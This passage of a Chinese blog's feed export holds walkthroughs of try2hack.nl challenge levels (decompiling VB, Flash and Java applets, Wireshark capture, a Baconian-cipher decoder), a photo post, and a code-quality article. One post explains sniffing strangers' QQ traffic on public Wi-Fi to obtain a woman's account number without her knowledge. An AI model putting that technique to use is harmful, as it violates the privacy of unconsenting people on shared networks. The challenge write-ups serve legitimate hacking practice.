Sub cmdLogin_Click ()If  edtUsername = Mid(gc0006, 56, 1) &amp;amp; Mid(gc0006, 28, 1) &amp;amp; Mid(gc0006, 35, 1) &amp;amp; Mid(gc0006, 3, 1) &amp;amp; Mid(gc0006, 44, 1) &amp;amp; Mid(gc0006, 11, 1) &amp;amp; Mid(gc0006, 13, 1) &amp;amp; Mid(gc0006, 21, 1) Then  If  edtPassword = Mid(gc0006, 45, 1) &amp;amp; Mid(gc0006, 48, 1) &amp;amp; Mid(gc0006, 25, 1) &amp;amp; Mid(gc0006, 32, 1) &amp;amp; Mid(gc0006, 15, 1) &amp;amp; Mid(gc0006, 40, 1) &amp;amp; Mid(gc0006, 25, 1) &amp;amp; Mid(gc0006, 14, 1) &amp;amp; Mid(gc0006, 19, 1) Then    MsgBox &quot;Level 6 can be found at: &quot; &amp;amp; Left$(gc000A, 37) &amp;amp; Mid(gc0006, 21, 1) &amp;amp; Mid(gc0006, 14, 1) &amp;amp; Mid(gc0006, 29, 1) &amp;amp; Mid(gc0006, 32, 1) &amp;amp; Mid(gc0006, 12, 1) &amp;amp; Mid(gc0006, 14, 1) &amp;amp; Mid(gc000A, 44, 6), 0, &quot;Horray!&quot;    End  End IfEnd IfMsgBox &quot;Invalid username and/or password!&quot;, 0, &quot;ERROR!&quot;End Sub
Sub Form_Load ()Me.Move (Screen.Width - Me.Width) / 2, (Screen.Height - Me.Height) / 2End Su&lt;/pre&gt;
c. Mid是VB的库函数，没有VB也没关系，逻辑是一样的，用其他语言实现一下，处理的字符串在MAIN.TXT里，可得到结果。关键知道反编译成功就行了。

&lt;strong&gt;第六关&lt;/strong&gt;地址：http://www.try2hack.nl/levels/level6-kdsvbd.xhtml

a. 打开网页，同样是VB程序，但是是Visual Basic 6.0的。先看看能不能反编译，试了一下第五关的Dodi，已经不管用了。到网上找了很久，感觉有，但是很多是商业版而且不知道管不管用。所以就打算从其他地方入手。

b. 运行LEVEL6.EXE，随便输入用户名密码，确定，嘿，发现连接了网络读取数据，这下有招了。

&lt;a href=&quot;/uploads/2011/02/level6_exe.png&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-114&quot; title=&quot;level6_exe&quot; src=&quot;/uploads/2011/02/level6_exe.png&quot; alt=&quot;&quot; width=&quot;471&quot; height=&quot;330&quot; /&gt;&lt;/a&gt;c. 还记得&lt;a href=&quot;http://www.hackfisher.info/blog/?p=68&quot; target=&quot;_blank&quot;&gt;如何在咖啡厅，网吧等公共场所要到漂亮MM的QQ号&lt;/a&gt;这篇文章了，那里用到了网络抓取工具&lt;span style=&quot;color: #333333; font-family: Georgia, 'Times New Roman', Times, serif; line-height: 26px;&quot;&gt;&lt;a style=&quot;text-decoration: underline; color: #772124;&quot; title=&quot;Wireshark&quot; href=&quot;http://www.wireshark.org/&quot; target=&quot;_blank&quot;&gt;Wireshark软件&lt;/a&gt;。这里我们也可以派上用场。首先获得try2hack.nl的ip，wireshark下设置过滤&quot;host 217.195.122.51&quot;，再测试一下，捕捉获得如下信息。&lt;/span&gt;

&lt;span style=&quot;color: #333333; font-family: Georgia, 'Times New Roman', Times, serif; line-height: 26px;&quot;&gt;&lt;a href=&quot;/uploads/2011/02/level6_capture.png&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-115&quot; title=&quot;level6_capture&quot; src=&quot;/uploads/2011/02/level6_capture.png&quot; alt=&quot;&quot; width=&quot;685&quot; height=&quot;379&quot; /&gt;&lt;/a&gt;d. 将level6.data下载下来，获得如下文本：&lt;/span&gt;

&amp;nbsp;
&lt;pre escaped=&quot;true&quot; lang=&quot;php&quot; line=&quot;1&quot;&gt;(ENCRYPTION TYPE)

B*C*N**N

(USERNAME)

aaabb aaaaa aaaab abbab ababb aaaab

(PASSWORD)

aabaa abbaa aaaba baaaa babba abbba baaba abaaa abbab abbaa baaaa aaaaa babaa abaab baaab

(PAGE)

babab aabab abaab abbab aabbb aaaba&lt;/pre&gt;
&amp;nbsp;

&lt;span style=&quot;font-family: Georgia, 'Times New Roman', Times, serif; color: #333333;&quot;&gt;&lt;span style=&quot;line-height: 26px;&quot;&gt;e. 简单的Google搜索&quot;B*C*N**N ENCRYPTION&quot;后(google的技巧，*通配符要加引号)，获得如下链接&lt;/span&gt;&lt;/span&gt;

&lt;span style=&quot;font-family: Georgia, 'Times New Roman', Times, serif; color: #333333;&quot;&gt;&lt;span style=&quot;line-height: 26px;&quot;&gt;http://www.bbc.co.uk/dna/h2g2/A9837183&lt;/span&gt;&lt;/span&gt;

&lt;span style=&quot;font-family: Georgia, 'Times New Roman', Times, serif; color: #333333;&quot;&gt;&lt;span style=&quot;line-height: 26px;&quot;&gt;说明这是种编码方式，叫Baconian Cipher，写程序解码eve6.data得到用户名，密码和下一关的地址。&lt;/span&gt;&lt;/span&gt;

&amp;nbsp;
&lt;pre escaped=&quot;true&quot; lang=&quot;java&quot; line=&quot;1&quot;&gt;public class BaconianCypher {

	/**

	 * @param args

	 */

	public static void main(String[] args) {

		String[] a = new String[] {

				&quot;aaaaa&quot;, &quot;aaaab&quot;, &quot;aaaba&quot;, &quot;aaabb&quot;, &quot;aabaa&quot;, &quot;aabab&quot;, &quot;aabba&quot;, &quot;aabbb&quot;, &quot;abaaa&quot;,

				           &quot;abaaa&quot;, &quot;abaab&quot;, &quot;ababa&quot;, &quot;ababb&quot;, &quot;abbaa&quot;, &quot;abbab&quot;, &quot;abbba&quot;, &quot;abbbb&quot;, &quot;baaaa&quot;,

				           &quot;baaab&quot;, &quot;baaba&quot;, &quot;baabb&quot;, &quot;baabb&quot;, &quot;babaa&quot;, &quot;babab&quot;, &quot;babba&quot;, &quot;babbb&quot;

		};

		char[] digits = { 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z' };

		java.util.Map cypherMap = new java.util.HashMap();

		for (int i = 0; i &amp;lt; a.length; i ++) {

			cypherMap.put(a[i], digits[i]);

		}

		System.out.println(decode(new String[] {&quot;aaabb&quot;, &quot;aaaaa&quot;, &quot;aaaab&quot;, &quot;abbab&quot;, &quot;ababb&quot;, &quot;aaaab&quot;}, cypherMap));

		System.out.println(decode(new String[] {&quot;aabaa&quot;, &quot;abbaa&quot;, &quot;aaaba&quot;, &quot;baaaa&quot;, &quot;babba&quot;, &quot;abbba&quot;, &quot;baaba&quot;, &quot;abaaa&quot;, &quot;abbab&quot;, &quot;abbaa&quot;, &quot;baaaa&quot;, &quot;aaaaa&quot;, &quot;babaa&quot;, &quot;abaab&quot;, &quot;baaab&quot;}, cypherMap));

		System.out.println(decode(new String[] {&quot;babab&quot;, &quot;aabab&quot;, &quot;abaab&quot;, &quot;abbab&quot;, &quot;aabbb&quot;, &quot;aaaba&quot;}, cypherMap));

	}

	public static String decode(String[] txt, java.util.Map map) {

		StringBuffer sb = new StringBuffer();

		for (int i = 0; i &amp;lt; txt.length; i ++) {

			sb.append(map.get(txt[i]));

		}

		return sb.toString().toLowerCase();

	}

}&lt;/pre&gt;
参考资料：

1. http://www.woodmann.com/crackz/Tools.htm

2. http://www.program-transformation.org/Transform/VisualBasicDecompilers
</content>
 </entry>
 
 <entry>
   <title>【趣味Hack】Try2hack.nl第四关</title>
   <link href="http://hackfisher.github.com/blog/2011/02/try2hack_nl-4th"/>
   <updated>2011-02-15T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/02/try2hack_nl-4th</id>
   <content type="html">第四关地址：

http://www.try2hack.nl/levels/level4-kdnvxs.xhtml

a. 首先打开网页，可以看到有一个Applet，firebug查看该元素，可以看到Applet加载的PasswdLevel4.class

&lt;a href=&quot;/uploads/2011/02/level4_applet.png&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-105&quot; title=&quot;level4_applet&quot; src=&quot;/uploads/2011/02/level4_applet.png&quot; alt=&quot;&quot; width=&quot;688&quot; height=&quot;343&quot; /&gt;&lt;/a&gt;

b. 将该class文件下载下来保存，地址是：http://www.try2hack.nl/levels/PasswdLevel4.class

c. 用Java反编译工具反编译之，推荐一个好用的反编译工具：&lt;a href=&quot;http://yangtsefisher.javaeye.com/blog/907317&quot; target=&quot;_blank&quot;&gt;jd-gui&lt;/a&gt;。从反编译的源文件代码片段可以看出还有个level4文件，下载下来
&lt;pre escaped=&quot;true&quot; lang=&quot;java&quot; line=&quot;1&quot;&gt;this.infile = new String(&quot;level4&quot;);
try
{
this.inURL = new URL(super.getCodeBase(), this.infile);
}
catch (MalformedURLException localMalformedURLException)
{
super.getAppletContext().showStatus(&quot;Bad Counter URL:&quot; + this.inURL);
}
inFile();
this.infile = new String(&quot;level4&quot;);    try    {      this.inURL = new URL(super.getCodeBase(), this.infile);    }    catch (MalformedURLException localMalformedURLException)    {      

super.getAppletContext().showStatus(&quot;Bad Counter URL:&quot; + this.inURL);    }

inFile();&lt;/pre&gt;
d. leve4文件地址：http://www.try2hack.nl/levels/level4，打开后就可以看到答案了。
</content>
 </entry>
 
 <entry>
   <title>情人节●南京●晨雪</title>
   <link href="http://hackfisher.github.com/blog/2011/02/%25e6%2583%2585%25e4%25ba%25ba%25e8%258a%2582%25e2%2597%258f%25e5%258d%2597%25e4%25ba%25ac%25e2%2597%258f%25e6%2599%25a8%25e9%259b%25aa"/>
   <updated>2011-02-15T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/02/%e6%83%85%e4%ba%ba%e8%8a%82%e2%97%8f%e5%8d%97%e4%ba%ac%e2%97%8f%e6%99%a8%e9%9b%aa</id>
   <content type="html">昨天是情人节，据说南京半城下雪，半城没下，有人进地铁时还阳光高照，出地铁就见到漫天大雪了。
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;strong&gt;亭子&lt;/strong&gt;&lt;/p&gt;
&lt;a href=&quot;/uploads/2011/02/IMG_1259.jpg&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-85&quot; title=&quot;IMG_1259&quot; src=&quot;/uploads/2011/02/IMG_1259.jpg&quot; alt=&quot;&quot; width=&quot;800&quot; height=&quot;600&quot; /&gt;&lt;/a&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;strong&gt;行人&lt;/strong&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;/uploads/2011/02/IMG_1261.jpg&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-86&quot; title=&quot;IMG_1261&quot; src=&quot;/uploads/2011/02/IMG_1261.jpg&quot; alt=&quot;&quot; width=&quot;800&quot; height=&quot;600&quot; /&gt;&lt;/a&gt;&lt;strong&gt;树木&lt;/strong&gt;&lt;/p&gt;
&lt;a href=&quot;/uploads/2011/02/IMG_1258.jpg&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-87&quot; title=&quot;IMG_1258&quot; src=&quot;/uploads/2011/02/IMG_1258.jpg&quot; alt=&quot;&quot; width=&quot;600&quot; height=&quot;800&quot; /&gt;&lt;/a&gt;
</content>
 </entry>
 
 <entry>
   <title>【趣味Hack】黑客模拟攻击闯关网站，闯前两关</title>
   <link href="http://hackfisher.github.com/blog/2011/02/try2hack-first-second"/>
   <updated>2011-02-13T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/02/try2hack-first-second</id>
   <content type="html">黑客模拟攻击闯关网站的地址是：http://www.try2hack.nl/。

下面是闯前两关的过程：

&lt;strong&gt;第一关&lt;/strong&gt;：http://www.try2hack.nl/levels/

a.打开页面后，看到一个click here to continue的按钮，用firebug查看其源代码，发现调用了Try()函数，如下图：

&lt;a href=&quot;/uploads/2011/02/find_try.png&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-77&quot; title=&quot;find_try&quot; src=&quot;/uploads/2011/02/find_try.png&quot; alt=&quot;&quot; width=&quot;604&quot; height=&quot;131&quot; /&gt;&lt;/a&gt;b. 将firebug切换到脚本，搜索&quot;Try&quot;，会发现如下脚本，找到密码答案：

&lt;a href=&quot;/uploads/2011/02/find_passwd.png&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-78&quot; title=&quot;find_passwd&quot; src=&quot;/uploads/2011/02/find_passwd.png&quot; alt=&quot;&quot; width=&quot;471&quot; height=&quot;230&quot; /&gt;&lt;/a&gt;

&lt;strong&gt;第二关&lt;/strong&gt;：http://www.try2hack.nl/levels/level2-xfdgnh.xhtml

a. 打开网页，经过简单分析后，发现要找到用户名和密码，而用户名和密码是用的flash。简单搜寻脚本之后，发现如下passwd，但没有用户名，其实是迷惑性的。

&lt;a href=&quot;/uploads/2011/02/find_itissoeasy.png&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-79&quot; title=&quot;find_itissoeasy&quot; src=&quot;/uploads/2011/02/find_itissoeasy.png&quot; alt=&quot;&quot; width=&quot;517&quot; height=&quot;162&quot; /&gt;&lt;/a&gt;b. 从flash入手才是正道，还是利用firebug，打开网络，发现如下level2.swf，在最下面

&lt;a href=&quot;/uploads/2011/02/find_level2_swf.png&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-80&quot; title=&quot;find_level2_swf&quot; src=&quot;/uploads/2011/02/find_level2_swf.png&quot; alt=&quot;&quot; width=&quot;588&quot; height=&quot;405&quot; /&gt;&lt;/a&gt;c. 将该swf下载下来，然后从这个swf上想办法。firefox默认的缓存位置是C:\Documents and Settings\YourAcount\Local Settings\Temporary Internet Files，搜索*.swf，找到swf缓存文件。

d. 先想办法看看能不能反编译过来，找到一个&lt;a title=&quot;swf反编译&quot; href=&quot;http://yangchangqing878.javaeye.com/blog/671148&quot; target=&quot;_blank&quot;&gt;swf的反编译工具&lt;/a&gt;，下载下来，好像是叫Flare.

e. 反编译一下，嗨，还真行，变成了as，得到如下.flr文件，得到用户名和密码，过关!

&lt;a href=&quot;/uploads/2011/02/decompile_swf.png&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-81&quot; title=&quot;decompile_swf&quot; src=&quot;/uploads/2011/02/decompile_swf.png&quot; alt=&quot;&quot; width=&quot;669&quot; height=&quot;513&quot; /&gt;&lt;/a&gt;

&lt;strong&gt;第三关&lt;/strong&gt;：http://www.try2hack.nl/levels/level3-.xhtml (未完待续)
</content>
 </entry>
 
 <entry>
   <title>【趣味Hack】如何在咖啡厅，网吧等公共场所要到漂亮MM的QQ号</title>
   <link href="http://hackfisher.github.com/blog/2011/02/cafe-bar-girls-qq"/>
   <updated>2011-02-13T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/02/cafe-bar-girls-qq</id>
   <content type="html">今天是2月14号，情人节，如果你还是光棍的话，也许想趁这个机会告别单身。如果你现在在咖啡厅、网吧等公共场所上网，或者宽松的工作场所，我也许能帮你一点忙。找到目标后第一步，就是要到对方的QQ号。

当然，如果你很自信，并且自己长得很帅，对异性有吸引力，脸皮厚点其实也行，你大可以直接走过去自己要过来。如果你像我一样，天生内向又害羞，我提供了另外一种选择，通过局域网络的抓包分析，步骤如下。

1. 首先陌生的漂亮MM得和你在同一个局域网内，并且正在使用QQ聊天，否则就算我有三头六臂也无法帮助你了。

&lt;a href=&quot;/uploads/2011/02/cafe_beauty.jpg&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-73&quot; title=&quot;cafe_beauty&quot; src=&quot;/uploads/2011/02/cafe_beauty.jpg&quot; alt=&quot;&quot; width=&quot;500&quot; height=&quot;375&quot; /&gt;&lt;/a&gt;

2. 下载并安装&lt;a title=&quot;Wireshark&quot; href=&quot;http://www.wireshark.org/&quot; target=&quot;_blank&quot;&gt;Wireshark软件&lt;/a&gt;，记得安装之前得安装WinPcap。

3. 打开运行Wireshark，在Filter:里面输入oicq，回车，因为QQ用的是oicq协议。所有QQ的网络交互就会显示，下面你唯一要做的就是守株待兔，想要追到漂亮MM，耐心是必不可少的。

&lt;a href=&quot;/uploads/2011/02/filter.png&quot;&gt;&lt;img class=&quot;aligncenter size-medium wp-image-69&quot; title=&quot;filter&quot; src=&quot;/uploads/2011/02/filter.png&quot; alt=&quot;&quot;/&gt;&lt;/a&gt;

4. 机会来了，你发现一个oicq数据交互包。展开，找到一个OICQ那一栏，看看那后面是什么，不就是你想要的那个QQ号吗。

&lt;a href=&quot;/uploads/2011/02/qq.png&quot;&gt;&lt;img class=&quot;aligncenter size-medium wp-image-70&quot; title=&quot;qq&quot; src=&quot;/uploads/2011/02/qq.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;5. 尝试加她的QQ吧，剩下的靠你的本事了。

这篇文章的内容属于趣味Hack，供宅男们自娱自乐，顺便学习一下网络知识。其实开发成商业应用也未尝不可，目前网络上的一种软件QQ Sniffer就提供类似功能。
</content>
 </entry>
 
 <entry>
   <title>代码质量系列之六：重复代码实战案例及其分析总结</title>
   <link href="http://hackfisher.github.com/blog/2011/02/best-practice-repeat-code-and-analytics"/>
   <updated>2011-02-09T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/02/best-practice-repeat-code-and-analytics</id>
   <content type="html">&lt;span style=&quot;font-size: 14px;&quot;&gt;&lt;strong&gt;案例一&lt;/strong&gt;：使用递归去除嵌套重复代码，不难看出下面的代码一层套一层，但是代码完全一样，递归是最佳解决方案。&lt;/span&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;widows: 2; text-transform: none; text-indent: 0px; border-collapse: separate; font: medium Simsun; white-space: normal; orphans: 2; letter-spacing: normal; color: #000000; word-spacing: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;border-collapse: collapse; font-family: arial, sans-serif; font-size: 13px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;widows: 2; text-transform: none; text-indent: 0px; border-collapse: separate; font: medium Simsun; white-space: normal; orphans: 2; letter-spacing: normal; color: #000000; word-spacing: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;border-collapse: collapse; font-family: arial, sans-serif; font-size: 13px;&quot;&gt;if (tokenizer.hasMoreTokens()) {&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;div&gt;
&lt;blockquote&gt;
&lt;div&gt;try {&lt;/div&gt;
&lt;div&gt;Integer.parseInt(tokenizer.&lt;wbr&gt;nextToken().trim());&lt;/wbr&gt;&lt;/div&gt;
&lt;div&gt;} catch (NumberFormatException nfe) {&lt;/div&gt;
&lt;div&gt;throwFormatException();&lt;/div&gt;
&lt;div&gt;}&lt;/div&gt;
&lt;div&gt;if (tokenizer.hasMoreTokens()) {&lt;/div&gt;
&lt;div&gt;try {&lt;/div&gt;
&lt;div&gt;Integer.parseInt(tokenizer.&lt;wbr&gt;nextToken().trim());&lt;/wbr&gt;&lt;/div&gt;
&lt;div&gt;} catch (NumberFormatException nfe) {&lt;/div&gt;
&lt;div&gt;throwFormatException();&lt;/div&gt;
&lt;div&gt;}&lt;/div&gt;
&lt;div&gt;if (tokenizer.hasMoreTokens()) {&lt;/div&gt;
&lt;div&gt;try {&lt;/div&gt;
&lt;div&gt;Integer.parseInt(tokenizer.&lt;wbr&gt;nextToken().trim());&lt;/wbr&gt;&lt;/div&gt;
&lt;div&gt;} catch (NumberFormatException nfe) {&lt;/div&gt;
&lt;div&gt;throwFormatException();&lt;/div&gt;
&lt;div&gt;}&lt;/div&gt;
&lt;div&gt;if (tokenizer.hasMoreTokens()) {&lt;/div&gt;
&lt;div&gt;try {&lt;/div&gt;
&lt;div&gt;Integer.parseInt(tokenizer.&lt;wbr&gt;nextToken().trim());&lt;/wbr&gt;&lt;/div&gt;
&lt;div&gt;} catch (NumberFormatException nfe) {&lt;/div&gt;
&lt;div&gt;throwFormatException();&lt;/div&gt;
&lt;div&gt;}&lt;/div&gt;
&lt;div&gt;} else {&lt;/div&gt;
&lt;div&gt;throwFormatException();&lt;/div&gt;
&lt;div&gt;}&lt;/div&gt;
&lt;div&gt;} else {&lt;/div&gt;
&lt;div&gt;throwFormatException();&lt;/div&gt;
&lt;div&gt;}&lt;/div&gt;
&lt;div&gt;} else {&lt;/div&gt;
&lt;div&gt;throwFormatException();&lt;/div&gt;
&lt;div&gt;}&lt;/div&gt;
&lt;div&gt;} else {&lt;/div&gt;
&lt;div&gt;throwFormatException();&lt;/div&gt;
&lt;div&gt;}&lt;/div&gt;&lt;/blockquote&gt;
&lt;/div&gt;
&lt;div&gt;&lt;strong&gt;案例二&lt;/strong&gt;：这个重复代码，很多刚学编程的新手易犯的毛病，内在的逻辑重复，常量完全可以用变量代替：showGuidLine.setEnabled(isSelected());&lt;/div&gt;
&lt;div&gt;
&lt;div&gt;
&lt;blockquote&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;widows: 2; text-transform: none; text-indent: 0px; border-collapse: separate; font: medium Simsun; white-space: normal; orphans: 2; letter-spacing: normal; color: #000000; word-spacing: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px;&quot;&gt;if(isSelected()) {&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;showGuidLine.setEnabled(true);&lt;/div&gt;
&lt;div&gt;} else {&lt;/div&gt;
&lt;div&gt;showGuidLine.setEnabled(false)&lt;wbr&gt;;&lt;/wbr&gt;&lt;/div&gt;
&lt;div&gt;}&lt;/div&gt;&lt;/blockquote&gt;
&lt;/div&gt;
&lt;div&gt;&lt;strong&gt;案例三&lt;/strong&gt;：Tree, ATree, BTree, CTree，复杂继承为多个类，仅仅因为ATree, BTree, CTree的节点Node或其加载方式不同。&lt;/div&gt;
&lt;div&gt;解决方式：保留一个Tree模板，&lt;span class=&quot;Apple-style-span&quot; style=&quot;widows: 2; text-transform: none; text-indent: 0px; border-collapse: separate; font: medium Simsun; white-space: normal; orphans: 2; letter-spacing: normal; color: #000000; word-spacing: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;border-collapse: collapse; font-family: arial, sans-serif; font-size: 13px;&quot;&gt;NodesLoader用来处理Node，分为ANodeLoader, BNodesLoader等等。&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;widows: 2; text-transform: none; text-indent: 0px; border-collapse: separate; font: medium Simsun; white-space: normal; orphans: 2; letter-spacing: normal; color: #000000; word-spacing: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px;&quot;&gt;复杂继承(不利于重用)--&amp;gt;模板+工厂模式+接口抽象--&amp;gt; 组合方式(复合优于继承)&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;利用工厂模式和接口，化整为零，便于复用&lt;/div&gt;
&lt;div&gt;面向对象OO，模型细分&lt;/div&gt;
&lt;div&gt;&lt;strong&gt;案例四&lt;/strong&gt;：&lt;span class=&quot;Apple-style-span&quot; style=&quot;widows: 2; text-transform: none; text-indent: 0px; border-collapse: separate; font: medium Simsun; white-space: normal; orphans: 2; letter-spacing: normal; color: #000000; word-spacing: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;border-collapse: collapse; font-family: arial, sans-serif; font-size: 13px;&quot;&gt;Swing中有很多类似下面例子的小控件，都可以用类似的模式生产：&lt;wbr&gt;一组独立的控件+一个相关接口，这样最大的好处就是解耦，方便复用。&lt;/wbr&gt;&lt;/span&gt;&lt;/span&gt;
&lt;div&gt;
&lt;div&gt;
&lt;blockquote&gt;
&lt;div&gt;public class SearchPane extends BasicPane {&lt;/div&gt;
&lt;div&gt;/*&lt;/div&gt;
&lt;div&gt;* 模糊查询用&lt;/div&gt;
&lt;div&gt;*/&lt;/div&gt;
&lt;div&gt;public JTextField searchField = new JTextField();&lt;/div&gt;
&lt;div&gt;public SearchPane(final Searchable searchable) {&lt;/div&gt;
&lt;div&gt;final JButton searchButton = new JButton();&lt;/div&gt;
&lt;div&gt;searchButton.setIcon(&lt;wbr&gt;BaseUtils.readIcon(&quot;/com/fr/&lt;wbr&gt;design/images/m_file/preview.&lt;wbr&gt;png&quot;));&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/div&gt;
&lt;div&gt;searchButton.setPreferredSize(&lt;wbr&gt;new Dimension(25, this.getHeight()));&lt;/wbr&gt;&lt;/div&gt;
&lt;div&gt;searchButton.&lt;wbr&gt;addActionListener(new ActionListener() {&lt;/wbr&gt;&lt;/div&gt;
&lt;div&gt;@Override&lt;/div&gt;
&lt;div&gt;public void actionPerformed(ActionEvent e) {&lt;/div&gt;
&lt;div&gt;searchable.search(searchField.&lt;wbr&gt;getText());&lt;/wbr&gt;&lt;/div&gt;
&lt;div&gt;}&lt;/div&gt;
&lt;div&gt;});&lt;/div&gt;
&lt;div&gt;searchField.addKeyListener(new KeyAdapter() {&lt;/div&gt;
&lt;div&gt;public void keyPressed(KeyEvent e) {&lt;/div&gt;
&lt;div&gt;if (e.getKeyCode() == KeyEvent.VK_ENTER) {&lt;/div&gt;
&lt;div&gt;searchable.search(searchField.&lt;wbr&gt;getText());&lt;/wbr&gt;&lt;/div&gt;
&lt;div&gt;e.consume();&lt;/div&gt;
&lt;div&gt;}&lt;/div&gt;
&lt;div&gt;}&lt;/div&gt;
&lt;div&gt;});&lt;/div&gt;
&lt;div&gt;this.setLayout(new BorderLayout());&lt;/div&gt;
&lt;div&gt;this.add(searchField,&lt;wbr&gt;BorderLayout.CENTER);&lt;/wbr&gt;&lt;/div&gt;
&lt;div&gt;this.add(searchButton,&lt;wbr&gt;BorderLayout.EAST);&lt;/wbr&gt;&lt;/div&gt;
&lt;div&gt;}&lt;/div&gt;
&lt;div&gt;&lt;strong&gt;public static interface Searchable {&lt;/strong&gt;&lt;/div&gt;
&lt;div&gt;&lt;strong&gt;public void search(String key);&lt;/strong&gt;&lt;/div&gt;
&lt;div&gt;&lt;strong&gt;}&lt;/strong&gt;&lt;/div&gt;
&lt;div&gt;}&lt;/div&gt;&lt;/blockquote&gt;
&lt;strong&gt;案例五&lt;/strong&gt;：ORM。使用数据结构进行抽象。服务器端JDBC的增删改查CRUD操作相信很多人都不陌生，可是如果有大量的Plain Object的话，一个类写一个会累死你，其实只要思考其本质，抽象一下，就可以概括为一个Map。这是数据库到服务器端内存的映射，其实还有很多其他映射，&lt;span class=&quot;Apple-style-span&quot; style=&quot;widows: 2; text-transform: none; text-indent: 0px; border-collapse: separate; font: medium Simsun; white-space: normal; orphans: 2; letter-spacing: normal; color: #000000; word-spacing: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;border-collapse: collapse; font-family: arial, sans-serif; font-size: 13px;&quot;&gt;DataBinding(Data-Widget)，XML-&lt;wbr&gt;Object-Swing，GWT(Java-JS)等等。&lt;/wbr&gt;&lt;/span&gt;&lt;/span&gt;

&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;widows: 2; text-transform: none; text-indent: 0px; border-collapse: separate; font: medium Simsun; white-space: normal; orphans: 2; letter-spacing: normal; color: #000000; word-spacing: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;border-collapse: collapse; font-family: arial, sans-serif; font-size: 13px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;widows: 2; text-transform: none; text-indent: 0px; border-collapse: separate; font: medium Simsun; white-space: normal; orphans: 2; letter-spacing: normal; color: #000000; word-spacing: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;border-collapse: collapse; font-family: arial, sans-serif; font-size: 13px;&quot;&gt;很多东西抽象起来不过就是个Map，可以用循环遍历的东西，&lt;wbr&gt;为什么偏偏要用代码一个个机械的去列举，制造重复。&lt;span class=&quot;Apple-style-span&quot; style=&quot;widows: 2; text-transform: none; text-indent: 0px; border-collapse: separate; font: medium Simsun; white-space: normal; orphans: 2; letter-spacing: normal; color: #000000; word-spacing: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;border-collapse: collapse; font-family: arial, sans-serif; font-size: 